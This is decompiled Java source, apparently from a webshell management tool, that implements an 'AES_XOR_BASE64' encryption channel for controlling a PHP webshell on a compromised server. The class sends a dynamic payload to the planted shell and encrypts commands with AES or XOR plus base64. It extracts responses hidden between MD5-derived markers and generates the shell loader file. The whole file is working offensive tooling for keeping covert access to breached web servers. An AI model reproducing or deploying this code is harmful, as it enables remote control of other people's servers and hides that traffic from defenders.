//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.cryptions.phpXor;

import core.annotation.CryptionAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;
import java.net.URLEncoder;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import shells.channel.HttpRequestChannel;
import shells.channel.RequestChannel;
import util.Log;
import util.functions;

@CryptionAnnotation(
        Name = "PHP_AES_XOR_BASE64",
        payloadName = "PhpDynamicPayload"
)
public class PHPAESXOR implements Cryption {
    private ShellEntity shell;
    private RequestChannel request;
    private Cipher decodeCipher;
    private Cipher encodeCipher;
    private boolean isAes;
    private boolean isFirst;
    private byte[] key;
    private boolean state;
    private String pass;
    private byte[] payload;
    private byte[] findStrLeft;
    private byte[] findStrRight;
    private String suffix = "php";

    public PHPAESXOR() {
    }

    public void init(ShellEntity context) {
        this.shell = context;
        this.request = new HttpRequestChannel(context);
        context.setRequest(this.request);
        this.key = this.shell.getSecretKeyX().getBytes();
        this.pass = this.shell.getPassword();
        String findStrMd5 = functions.md5(this.pass + new String(this.key));
        this.isFirst = true;
        this.findStrLeft = findStrMd5.substring(0, 16).getBytes();
        this.findStrRight = findStrMd5.substring(16).getBytes();
        this.shell.putHeader("Content-Type", "application/x-www-form-urlencoded");
        try {
            this.encodeCipher = Cipher.getInstance("AES");
            this.decodeCipher = Cipher.getInstance("AES");
            this.encodeCipher.init(1, new SecretKeySpec(this.key, "AES"));
            this.decodeCipher.init(2, new SecretKeySpec(this.key, "AES"));
            this.payload = this.shell.getPayloadModule().getPayload();
            if (this.payload != null) {
                this.request.sendRequest(this.payload);
                this.state = true;
            } else {
                Log.error("payload Is Null");
            }

        } catch (Exception var4) {
            Log.error(var4);
        }
    }

    public synchronized byte[] encode(byte[] data) {
        try {
            byte[] target = new byte[0];
            if (this.isAes) {
                target = this.encodeCipher.doFinal(data);
            } else {
                target = this.xor(data);
            }

            return (this.pass + "=" + URLEncoder.encode(functions.base64EncodeToString(target))).getBytes();
        } catch (Exception var3) {
            Log.error(var3);
            return null;
        }
    }

    public synchronized byte[] decode(byte[] data) {
        if (data != null && data.length > 0) {
            try {
                byte[] result = this.findStr(data);
                if (result != null && result.length > 0) {
                    result = functions.base64Decode(result);
                    if (this.isFirst) {
                        try {
                            this.decodeCipher.doFinal(result);
                            this.isAes = true;
                        } catch (Exception var4) {
                            this.isAes = false;
                            this.isFirst = false;
                        }
                    }

                    return this.isAes ? this.decodeCipher.doFinal(result) : this.xor(result);
                } else {
                    return null;
                }
            } catch (Exception var5) {
                Log.error(var5);
                return null;
            }
        } else {
            return data;
        }
    }

    public boolean isSendRLData() {
        return true;
    }

    public byte[] xor(byte[] data) {
        int len = data.length;
        int keyLen = this.key.length;


        for(int i = 1; i <= len; ++i) {
            int index = i - 1;
            data[index] ^= this.key[i % keyLen];
        }

        return data;
    }

    public byte[] findStr(byte[] respResult) {
        return functions.subMiddleBytes(respResult, this.findStrLeft, this.findStrRight);
    }

    public boolean check() {
        return this.state;
    }

    public String getSuffix() {
        return this.suffix;
    }

    public byte[] generate(String password, String secretKey) {
        return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), "aesxor.bin");
    }
}
